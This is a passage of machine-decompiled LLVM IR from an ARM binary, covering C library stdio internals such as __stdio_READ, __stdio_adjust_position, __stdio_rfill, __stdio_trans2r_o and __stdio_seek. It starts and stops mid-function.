  call void @__pseudo_branch(i32 79548)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_15f34, %dec_label_pc_15e50, %bb
  %v0_15f4c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15f4c, i32* %r0.global-to-local, align 4
  store i32 %v3_15e38, i32* @r4, align 4
  store i32 %v6_15e38, i32* @r5, align 4
  store i32 %v9_15e38, i32* @r6, align 4
  ret i32 %v0_15f4c

; uselistorder directives
  uselistorder i32 %v0_15edc, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 8, 7, 11, 9, 10, 12 }
  uselistorder i32 ()* @__pthread_return_0, { 36, 27, 26, 25, 24, 23, 22, 21, 11, 35, 45, 44, 19, 10, 9, 8, 42, 41, 40, 39, 7, 0, 6, 5, 4, 3, 2, 1, 14, 13, 12, 20, 17, 16, 15, 31, 18, 38, 30, 37, 43, 29, 28, 34, 33, 32 }
  uselistorder i32 ptrtoint (i8* @global_var_136b4.305 to i32), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__pthread_return_void, { 42, 39, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 1, 0, 41, 40, 48, 47, 46, 45, 9, 8, 11, 10, 6, 5, 4, 3, 2, 32, 31, 30, 7, 44, 29, 43, 28, 27, 26, 25, 38, 37, 36, 35, 34, 33 }
  uselistorder i32 79548, { 0, 5, 6, 7, 8, 1, 9, 10, 11, 2, 3, 4, 12 }
  uselistorder i32 52, { 3, 1, 5, 2, 0, 6, 4 }
  uselistorder i32 22, { 3, 12, 4, 11, 5, 6, 7, 16, 13, 8, 14, 0, 15, 9, 10, 1, 2 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15f34, { 1, 0 }
  uselistorder label %dec_label_pc_15f30, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15edc, { 1, 0 }
  uselistorder label %dec_label_pc_15ea4, { 1, 0 }
}

define i32 @__stdio_READ(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15f68 = load i32, i32* @r4, align 4
  store i32 %v3_15f68, i32* %stack_var_-12, align 4
  %v3_15f6c = load i8, i8* %arg1, align 1
  %v4_15f6c = zext i8 %v3_15f6c to i32
  store i32 %v4_15f6c, i32* %r3.global-to-local, align 4
  %v1_15f70 = and i32 %v4_15f6c, 4
  store i32 %v1_15f70, i32* %r5.global-to-local, align 4
  %v2_15f70 = icmp eq i32 %v1_15f70, 0
  store i1 %v2_15f70, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_15f70, label %bb8, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_15f68, i32* @r4, align 4
  ret i32 0

bb8:                                              ; preds = %entry
  %v1_15f80 = icmp slt i32 %arg2, 0
  %v2_15f80 = icmp eq i32 %arg2, 0
  store i1 %v2_15f80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_15f80, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_15f88 = add i32 %tmp, 4
  %v2_15f88 = inttoptr i32 %v1_15f88 to i32*
  %v3_15f88 = load i32, i32* %v2_15f88, align 4
  store i32 %v3_15f88, i32* %r0.global-to-local, align 4
  %v1_15f8c = call i32 @__libc_read(i32 %v3_15f88)
  store i32 %v1_15f8c, i32* %r0.global-to-local, align 4
  %v2_15f90 = icmp eq i32 %v1_15f8c, 0
  store i1 %v2_15f90, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_15f8c, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_15f94 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_15f94, i32* @r4, align 4
  ret i32 %v1_15f8c

bb13:                                             ; preds = %bb10
  %v0_15f98 = load i32, i32* @r4, align 4
  %v1_15f98 = inttoptr i32 %v0_15f98 to i32*
  %v2_15f98 = load i32, i32* %v1_15f98, align 4
  %v1_15f9c = or i32 %v2_15f98, 8
  store i32 %v1_15f9c, i32* %r1.global-to-local, align 4
  %v1_15fa0 = or i32 %v2_15f98, 4
  store i32 %v1_15fa0, i32* %r3.global-to-local, align 4
  %v3_15fa4 = sdiv i32 %v2_15f98, 256
  store i32 %v3_15fa4, i32* @ip, align 4
  br i1 %v2_15f90, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_15fac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_15fac, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_15fb0 = trunc i32 %v3_15fa4 to i8
  %v4_15fb0 = add i32 %v0_15f98, 1
  %v5_15fb0 = inttoptr i32 %v4_15fb0 to i8*
  store i8 %v2_15fb0, i8* %v5_15fb0, align 1
  %v0_15fb4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15fb4.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_15fb4 = load i32, i32* %r3.global-to-local, align 4
  %v2_15fb4 = trunc i32 %v1_15fb4 to i8
  %v3_15fb4 = load i32, i32* @r4, align 4
  %v4_15fb4 = inttoptr i32 %v3_15fb4 to i8*
  store i8 %v2_15fb4, i8* %v4_15fb4, align 1
  %v0_15fb8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15fb8.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_15fb8 = load i32, i32* @ip, align 4
  %v2_15fb8 = trunc i32 %v1_15fb8 to i8
  %v3_15fb8 = load i32, i32* @r4, align 4
  %v4_15fb8 = add i32 %v3_15fb8, 1
  %v5_15fb8 = inttoptr i32 %v4_15fb8 to i8*
  store i8 %v2_15fb8, i8* %v5_15fb8, align 1
  %v0_15fbc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15fbc.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_15fbc = load i32, i32* %r1.global-to-local, align 4
  %v2_15fbc = trunc i32 %v1_15fbc to i8
  %v3_15fbc = load i32, i32* @r4, align 4
  %v4_15fbc = inttoptr i32 %v3_15fbc to i8*
  store i8 %v2_15fbc, i8* %v4_15fbc, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_15fc0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15fc0, i32* @r4, align 4
  %v11_15fc0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_15fc0

; uselistorder directives
  uselistorder i32 %v3_15fa4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 5, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 (i32)* @__libc_read, { 1, 2, 0 }
  uselistorder i32 2147483647, { 2, 3, 0, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_adjust_position(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_15fc4 = load i32, i32* @r4, align 4
  store i32 %v3_15fc4, i32* %stack_var_-16, align 4
  %v2_15fc8 = add i32 %tmp, 1
  %v3_15fc8 = inttoptr i32 %v2_15fc8 to i8*
  %v4_15fc8 = load i8, i8* %v3_15fc8, align 1
  %v5_15fc8 = zext i8 %v4_15fc8 to i32
  %v3_15fcc = load i8, i8* %arg1, align 1
  %v4_15fcc = zext i8 %v3_15fcc to i32
  store i32 %v4_15fcc, i32* %r2.global-to-local, align 4
  %v4_15fd0 = mul nuw nsw i32 %v5_15fc8, 256
  %v5_15fd0 = or i32 %v4_15fcc, %v4_15fd0
  store i32 %v5_15fd0, i32* @lr, align 4
  %tmp15 = urem i8 %v3_15fcc, 4
  %v2_15fd4 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_15fd4, label %bb, label %dec_label_pc_15fe4

bb:                                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  br label %.thread

dec_label_pc_15fe4:                               ; preds = %entry
  %v1_15fd4 = zext i8 %tmp15 to i32
  %v1_15fe4 = add nsw i32 %v1_15fd4, -1
  store i32 %v1_15fe4, i32* @ip, align 4
  %v7_15fe4 = icmp eq i8 %tmp15, 1
  br i1 %v7_15fe4, label %.thread, label %dec_label_pc_15fec

dec_label_pc_15fec:                               ; preds = %dec_label_pc_15fe4
  %v1_15fec = and i32 %v4_15fd0, 2048
  %v2_15fec = icmp eq i32 %v1_15fec, 0
  br i1 %v2_15fec, label %.thread, label %dec_label_pc_15ff4

dec_label_pc_15ff4:                               ; preds = %dec_label_pc_15fec
  %v8_15ff8 = icmp sgt i32 %v1_15fe4, 1
  br i1 %v8_15ff8, label %dec_label_pc_16084, label %dec_label_pc_15ffc

dec_label_pc_15ffc:                               ; preds = %dec_label_pc_15ff4
  %v2_15ffc = add i32 %tmp, 40
  %v3_15ffc = inttoptr i32 %v2_15ffc to i32*
  %v4_15ffc = load i32, i32* %v3_15ffc, align 4
  %v2_16000 = icmp eq i32 %v4_15ffc, 0
  br i1 %v2_16000, label %dec_label_pc_16008, label %dec_label_pc_16084

dec_label_pc_16008:                               ; preds = %dec_label_pc_15ffc
  %v2_16008 = add i32 %tmp, 3
  %v3_16008 = inttoptr i32 %v2_16008 to i8*
  %v4_16008 = load i8, i8* %v3_16008, align 1
  %v5_16008 = zext i8 %v4_16008 to i32
  %v2_1600c = add i32 %tmp, 44
  %v3_1600c = inttoptr i32 %v2_1600c to i32*
  %v4_1600c = load i32, i32* %v3_1600c, align 4
  store i32 %v4_1600c, i32* %r2.global-to-local, align 4
  %v2_16010 = sub nsw i32 %v1_15fe4, %v5_16008
  %v1_16018 = add nsw i32 %v2_16010, -1
  store i32 %v1_16018, i32* @ip, align 4
  %tmp11 = icmp slt i32 %v4_1600c, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_16008
  %v7_1601c = add i32 %tmp, 2
  %v8_1601c = inttoptr i32 %v7_1601c to i8*
  %v9_1601c = load i8, i8* %v8_1601c, align 1
  %v10_1601c = zext i8 %v9_1601c to i32
  %v7_16020 = sub nsw i32 %v1_16018, %v10_1601c
  store i32 %v7_16020, i32* @ip, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16008, %bb, %dec_label_pc_15fec, %dec_label_pc_15fe4, %bb12
  %v0_1603c = phi i32 [ %v1_15fe4, %dec_label_pc_15fec ], [ %v1_15fe4, %dec_label_pc_15fe4 ], [ 0, %bb ], [ %v7_16020, %bb12 ], [ %v1_16018, %dec_label_pc_16008 ]
  %v1_16024 = and i32 %v4_15fcc, 64
  %v2_16024 = icmp eq i32 %v1_16024, 0
  %storemerge.in.in.v = select i1 %v2_16024, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_16030 = add i32 %tmp, 16
  %v3_16030 = inttoptr i32 %v2_16030 to i32*
  %v4_16030 = load i32, i32* %v3_16030, align 4
  %v2_16034 = sub i32 %storemerge, %v4_16030
  %v1_16038 = inttoptr i32 %arg2 to i32*
  %v2_16038 = load i32, i32* %v1_16038, align 4
  store i32 %v2_16038, i32* %r1.global-to-local, align 4
  %v3_16038 = add i32 %arg2, 4
  %v4_16038 = inttoptr i32 %v3_16038 to i32*
  %v5_16038 = load i32, i32* %v4_16038, align 4
  store i32 %v5_16038, i32* %r2.global-to-local, align 4
  %v2_1603c = add i32 %v2_16034, %v0_1603c
  store i32 %v2_1603c, i32* %r5.global-to-local, align 4
  %v2_16040 = sub i32 %v2_16038, %v2_1603c
  %v2_16044 = and i32 %v2_1603c, 1073741824
  %v3_16044 = icmp ne i32 %v2_16044, 0
  %v6_16044 = icmp eq i1 %v3_16044, false
  %tmp16 = icmp slt i32 %v2_1603c, 0
  %v4_16044.neg = zext i1 %tmp16 to i32
  %v7_16044 = add i32 %v5_16038, %v4_16044.neg
  %v9_16044 = sext i1 %v6_16044 to i32
  %v10_16044 = add i32 %v7_16044, %v9_16044
  store i32 %v10_16044, i32* %r4.global-to-local, align 4
  store i32 %v2_16040, i32* %v1_16038, align 4
  %v5_16048 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16048, i32* %v4_16038, align 4
  %v0_1604c = load i32, i32* %r6.global-to-local, align 4
  %v1_1604c = add i32 %v0_1604c, 4
  %v2_1604c = inttoptr i32 %v1_1604c to i32*
  %v3_1604c = load i32, i32* %v2_1604c, align 4
  %v1_16050 = load i32, i32* %r2.global-to-local, align 4
  %v8_16054 = icmp sgt i32 %v3_1604c, %v1_16050
  br i1 %v8_16054, label %dec_label_pc_16068, label %dec_label_pc_16058

dec_label_pc_16058:                               ; preds = %.thread
  %v9_16050 = icmp eq i32 %v3_1604c, %v1_16050
  br i1 %v9_16050, label %dec_label_pc_1605c, label %dec_label_pc_1606cthread-pre-split

dec_label_pc_1605c:                               ; preds = %dec_label_pc_16058
  %v1_1605c = inttoptr i32 %v0_1604c to i32*
  %v2_1605c = load i32, i32* %v1_1605c, align 4
  %v1_16060 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_1605c, %v1_16060
  br i1 %tmp17, label %dec_label_pc_16068, label %dec_label_pc_1606cthread-pre-split

dec_label_pc_16068:                               ; preds = %dec_label_pc_1605c, %.thread
  %v0_16068 = load i32, i32* %r5.global-to-local, align 4
  %v1_16068 = sub i32 0, %v0_16068
  store i32 %v1_16068, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1606c

dec_label_pc_1606cthread-pre-split:               ; preds = %dec_label_pc_1605c, %dec_label_pc_16058
  %v0_1606c.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1606c

dec_label_pc_1606c:                               ; preds = %dec_label_pc_1606cthread-pre-split, %dec_label_pc_16068
  %v0_1606c = phi i32 [ %v0_1606c.pr, %dec_label_pc_1606cthread-pre-split ], [ %v1_16068, %dec_label_pc_16068 ]
  %v1_1606c = icmp slt i32 %v0_1606c, 0
  br i1 %v1_1606c, label %dec_label_pc_16074, label %dec_label_pc_16088

dec_label_pc_16074:                               ; preds = %dec_label_pc_1606c
  %v0_16074 = call i32 @__errno_location()
  %v2_1607c = inttoptr i32 %v0_16074 to i32*
  store i32 75, i32* %v2_1607c, align 4
  %v0_16088.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16088

dec_label_pc_16084:                               ; preds = %dec_label_pc_15ffc, %dec_label_pc_15ff4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16088

dec_label_pc_16088:                               ; preds = %dec_label_pc_1606c, %dec_label_pc_16074, %dec_label_pc_16084
  %v0_16088 = phi i32 [ %v0_1606c, %dec_label_pc_1606c ], [ %v0_16088.pre, %dec_label_pc_16074 ], [ -1, %dec_label_pc_16084 ]
  %v2_1608c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1608c, i32* @r4, align 4
  ret i32 %v0_16088

; uselistorder directives
  uselistorder i32 %v1_16050, { 1, 0 }
  uselistorder i32 %v3_1604c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_15fcc, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 1073741824, { 2, 3, 0, 1 }
  uselistorder i32 2048, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_16088, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16090 = load i32, i32* @r4, align 4
  store i32 %v3_16090, i32* %stack_var_-8, align 4
  %v1_16094 = add i32 %arg1, 8
  %v1_16098 = inttoptr i32 %v1_16094 to i32*
  %v2_16098 = load i32, i32* %v1_16098, align 4
  store i32 %v2_16098, i32* @r1, align 4
  %v3_16098 = add i32 %arg1, 12
  %v4_16098 = inttoptr i32 %v3_16098 to i32*
  %v5_16098 = load i32, i32* %v4_16098, align 4
  %v2_1609c = sub i32 %v5_16098, %v2_16098
  store i32 %v2_1609c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_160a4 = inttoptr i32 %arg1 to i8*
  %v4_160a4 = call i32 @__stdio_READ(i8* %v3_160a4, i32 %v2_16098, i32 %v2_1609c)
  %v0_160a8 = load i32, i32* @r4, align 4
  %v1_160a8 = add i32 %v0_160a8, 8
  %v2_160a8 = inttoptr i32 %v1_160a8 to i32*
  %v3_160a8 = load i32, i32* %v2_160a8, align 4
  store i32 %v3_160a8, i32* %r2.global-to-local, align 4
  %v2_160ac = add i32 %v3_160a8, %v4_160a4
  %v2_160b0 = add i32 %v0_160a8, 20
  %v3_160b0 = inttoptr i32 %v2_160b0 to i32*
  store i32 %v2_160ac, i32* %v3_160b0, align 4
  %v0_160b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_160b4 = load i32, i32* @r4, align 4
  %v2_160b4 = add i32 %v1_160b4, 16
  %v3_160b4 = inttoptr i32 %v2_160b4 to i32*
  store i32 %v0_160b4, i32* %v3_160b4, align 4
  %v2_160b8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_160b8, i32* @r4, align 4
  ret i32 %v4_160a4

; uselistorder directives
  uselistorder i32 %v4_160a4, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_160bc = load i32, i32* @r4, align 4
  store i32 %v3_160bc, i32* %stack_var_-12, align 4
  %v0_160c0 = load i32, i32* @r0, align 4
  %v1_160c0 = inttoptr i32 %v0_160c0 to i8*
  %v2_160c0 = load i8, i8* %v1_160c0, align 1
  %v3_160c0 = zext i8 %v2_160c0 to i32
  store i32 %v3_160c0, i32* %r2.global-to-local, align 4
  %v1_160c4 = add i32 %v0_160c0, 1
  %v2_160c4 = inttoptr i32 %v1_160c4 to i8*
  %v3_160c4 = load i8, i8* %v2_160c4, align 1
  %v4_160c4 = zext i8 %v3_160c4 to i32
  store i32 %v4_160c4, i32* %r3.global-to-local, align 4
  %v4_160c8 = mul nuw nsw i32 %v4_160c4, 256
  %v5_160c8 = or i32 %v4_160c8, %v3_160c0
  store i32 %v5_160c8, i32* %r2.global-to-local, align 4
  %v1_160cc = load i32, i32* @r1, align 4
  %v2_160cc = and i32 %v1_160cc, %v5_160c8
  %v4_160cc = icmp eq i32 %v2_160cc, 0
  store i32 %v0_160c0, i32* @r4, align 4
  br i1 %v4_160cc, label %dec_label_pc_160d8, label %dec_label_pc_160f0

dec_label_pc_160d8:                               ; preds = %entry
  %v1_160d8 = and i32 %v5_160c8, 2176
  %v2_160d8 = icmp eq i32 %v1_160d8, 0
  br i1 %v2_160d8, label %dec_label_pc_160e0, label %dec_label_pc_16104

dec_label_pc_160e0:                               ; preds = %dec_label_pc_160d8
  %v2_160e0 = or i32 %v1_160cc, %v5_160c8
  store i32 %v2_160e0, i32* %r2.global-to-local, align 4
  %v3_160e4 = sdiv i32 %v2_160e0, 256
  store i32 %v3_160e4, i32* %r3.global-to-local, align 4
  %v1_160e8 = trunc i32 %v3_160e4 to i8
  store i8 %v1_160e8, i8* %v2_160c4, align 1
  %v0_160ec = load i32, i32* %r2.global-to-local, align 4
  %v1_160ec = trunc i32 %v0_160ec to i8
  %v2_160ec = load i32, i32* @r0, align 4
  %v3_160ec = inttoptr i32 %v2_160ec to i8*
  store i8 %v1_160ec, i8* %v3_160ec, align 1
  %v0_160f0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_160f0

dec_label_pc_160f0:                               ; preds = %entry, %dec_label_pc_160e0
  %v0_160f0 = phi i32 [ %v0_160c0, %entry ], [ %v0_160f0.pre, %dec_label_pc_160e0 ]
  %v1_160f0 = inttoptr i32 %v0_160f0 to i8*
  %v2_160f0 = load i8, i8* %v1_160f0, align 1
  %v3_160f0 = zext i8 %v2_160f0 to i32
  store i32 %v3_160f0, i32* %r2.global-to-local, align 4
  %v1_160f4 = add i32 %v0_160f0, 1
  %v2_160f4 = inttoptr i32 %v1_160f4 to i8*
  %v3_160f4 = load i8, i8* %v2_160f4, align 1
  %v4_160f4 = zext i8 %v3_160f4 to i32
  %v4_160f8 = mul nuw nsw i32 %v4_160f4, 256
  %v5_160f8 = or i32 %v4_160f8, %v3_160f0
  store i32 %v5_160f8, i32* %r3.global-to-local, align 4
  %v1_160fc = and i32 %v3_160f0, 16
  store i32 %v1_160fc, i32* %r5.global-to-local, align 4
  %v2_160fc = icmp eq i32 %v1_160fc, 0
  br i1 %v2_160fc, label %dec_label_pc_1612c, label %dec_label_pc_16104

dec_label_pc_16104:                               ; preds = %dec_label_pc_160d8, %dec_label_pc_160f0
  %v0_16104 = call i32 @__errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1610c = inttoptr i32 %v0_16104 to i32*
  store i32 9, i32* %v2_1610c, align 4
  br label %dec_label_pc_16110

dec_label_pc_16110:                               ; preds = %dec_label_pc_16134, %dec_label_pc_16104
  %v0_16110 = load i32, i32* @r4, align 4
  %v1_16110 = inttoptr i32 %v0_16110 to i32*
  %v2_16110 = load i32, i32* %v1_16110, align 4
  %v1_16114 = or i32 %v2_16110, 8
  store i32 %v1_16114, i32* %r3.global-to-local, align 4
  %v3_16118 = sdiv i32 %v2_16110, 256
  store i32 %v3_16118, i32* %r2.global-to-local, align 4
  %v1_16120 = trunc i32 %v3_16118 to i8
  %v3_16120 = add i32 %v0_16110, 1
  %v4_16120 = inttoptr i32 %v3_16120 to i8*
  store i8 %v1_16120, i8* %v4_16120, align 1
  %v0_16124 = load i32, i32* %r3.global-to-local, align 4
  %v1_16124 = trunc i32 %v0_16124 to i8
  %v2_16124 = load i32, i32* @r4, align 4
  %v3_16124 = inttoptr i32 %v2_16124 to i8*
  store i8 %v1_16124, i8* %v3_16124, align 1
  %v2_16128 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16128, i32* @r4, align 4
  ret i32 -1

dec_label_pc_1612c:                               ; preds = %dec_label_pc_160f0
  %v1_1612c = and i32 %v3_160f0, 64
  %v2_1612c = icmp eq i32 %v1_1612c, 0
  br i1 %v2_1612c, label %dec_label_pc_1615c, label %dec_label_pc_16134

dec_label_pc_16134:                               ; preds = %dec_label_pc_1612c
  %v0_16134 = call i32 @__stdio_wcommit()
  %v2_16138 = icmp eq i32 %v0_16134, 0
  br i1 %v2_16138, label %dec_label_pc_16140, label %dec_label_pc_16110

dec_label_pc_16140:                               ; preds = %dec_label_pc_16134
  %v0_16140 = load i32, i32* @r4, align 4
  %v1_16140 = inttoptr i32 %v0_16140 to i32*
  %v2_16140 = load i32, i32* %v1_16140, align 4
  store i32 %v2_16140, i32* %r3.global-to-local, align 4
  %v1_16144 = add i32 %v0_16140, 8
  %v2_16144 = inttoptr i32 %v1_16144 to i32*
  %v3_16144 = load i32, i32* %v2_16144, align 4
  store i32 %v3_16144, i32* %r2.global-to-local, align 4
  %v1_16148 = and i32 %v2_16140, -65
  store i32 %v1_16148, i32* %r3.global-to-local, align 4
  %v3_1614c = sdiv i32 %v2_16140, 256
  store i32 %v3_1614c, i32* %r1.global-to-local, align 4
  %v2_16150 = add i32 %v0_16140, 28
  %v3_16150 = inttoptr i32 %v2_16150 to i32*
  store i32 %v3_16144, i32* %v3_16150, align 4
  %v0_16154 = load i32, i32* %r1.global-to-local, align 4
  %v1_16154 = trunc i32 %v0_16154 to i8
  %v2_16154 = load i32, i32* @r4, align 4
  %v3_16154 = add i32 %v2_16154, 1
  %v4_16154 = inttoptr i32 %v3_16154 to i8*
  store i8 %v1_16154, i8* %v4_16154, align 1
  %v0_16158 = load i32, i32* %r3.global-to-local, align 4
  %v1_16158 = trunc i32 %v0_16158 to i8
  %v2_16158 = load i32, i32* @r4, align 4
  %v3_16158 = inttoptr i32 %v2_16158 to i8*
  store i8 %v1_16158, i8* %v3_16158, align 1
  %v0_1615c.pre = load i32, i32* @r4, align 4
  %v0_16168.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1615c

dec_label_pc_1615c:                               ; preds = %dec_label_pc_1612c, %dec_label_pc_16140
  %v0_16168 = phi i32 [ 0, %dec_label_pc_1612c ], [ %v0_16168.pre, %dec_label_pc_16140 ]
  %v2_1616c = phi i32 [ %v0_160f0, %dec_label_pc_1612c ], [ %v0_1615c.pre, %dec_label_pc_16140 ]
  %v1_1615c = inttoptr i32 %v2_1616c to i32*
  %v2_1615c = load i32, i32* %v1_1615c, align 4
  %v1_16160 = or i32 %v2_1615c, 1
  store i32 %v1_16160, i32* %r3.global-to-local, align 4
  %v3_16164 = sdiv i32 %v2_1615c, 256
  store i32 %v3_16164, i32* %r2.global-to-local, align 4
  %v1_1616c = trunc i32 %v3_16164 to i8
  %v3_1616c = add i32 %v2_1616c, 1
  %v4_1616c = inttoptr i32 %v3_1616c to i8*
  store i8 %v1_1616c, i8* %v4_1616c, align 1
  %v0_16170 = load i32, i32* %r3.global-to-local, align 4
  %v1_16170 = trunc i32 %v0_16170 to i8
  %v2_16170 = load i32, i32* @r4, align 4
  %v3_16170 = inttoptr i32 %v2_16170 to i8*
  store i8 %v1_16170, i8* %v3_16170, align 1
  %v2_16174 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16174, i32* @r4, align 4
  ret i32 %v0_16168

; uselistorder directives
  uselistorder i32 %v3_16164, { 1, 0 }
  uselistorder i32 %v3_16118, { 1, 0 }
  uselistorder i32 %v3_160f0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_160f0, { 0, 2, 1 }
  uselistorder i32 %v3_160e4, { 1, 0 }
  uselistorder i32 %v5_160c8, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__stdio_wcommit, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_1615c, { 1, 0 }
  uselistorder label %dec_label_pc_16104, { 1, 0 }
  uselistorder label %dec_label_pc_160f0, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_1617c = load i32, i32* @r4, align 4
  %v6_1617c = load i32, i32* @lr, align 4
  %v1_16180 = add i32 %arg1, 4
  %v2_16180 = inttoptr i32 %v1_16180 to i32*
  %v3_16180 = load i32, i32* %v2_16180, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_16188 = load i32, i32* %arg2, align 4
  %v3_16188 = add i32 %tmp, 4
  %v4_16188 = inttoptr i32 %v3_16188 to i32*
  %v5_16188 = load i32, i32* %v4_16188, align 4
  %v6_1618c = call i32 @__libc_lseek64(i32 %v3_16180, i32 %v2_16188, i32 %v5_16188, i32 %arg3, i32 %v3_1617c, i32 %v6_1617c)
  %v1_16190 = icmp slt i32 %v2_16188, 0
  %v6_1618c. = select i1 %v1_16190, i32 %v6_1618c, i32 0
  store i32 %v6_1618c., i32* %r3.global-to-local, align 4
  br i1 %v1_16190, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_1619c = load i32, i32* @r4, align 4
  %v4_1619c = inttoptr i32 %v3_1619c to i32*
  store i32 %v6_1618c, i32* %v4_1619c, align 4
  %v6_1619c = add i32 %v3_1619c, 4
  %v7_1619c = inttoptr i32 %v6_1619c to i32*
  store i32 %v2_16188, i32* %v7_1619c, align 4
  %v0_161a0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %entry, %bb
